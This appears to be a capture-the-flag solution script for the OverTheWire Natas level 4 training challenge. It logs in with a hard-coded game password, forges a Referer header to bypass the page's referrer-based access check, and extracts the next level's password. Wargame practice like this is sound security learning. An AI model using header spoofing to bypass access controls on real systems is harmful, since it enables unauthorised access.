import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
url = 'http://%s.natas.labs.overthewire.org/index.php' % username

headers={'Referer': 'http://natas5.natas.labs.overthewire.org/'}

session = requests.Session()

response = session.get(url, auth=(username, password), headers = headers)

content = response.text

flag = re.findall('The password for natas5 is (.*)', content)[0]
print(flag)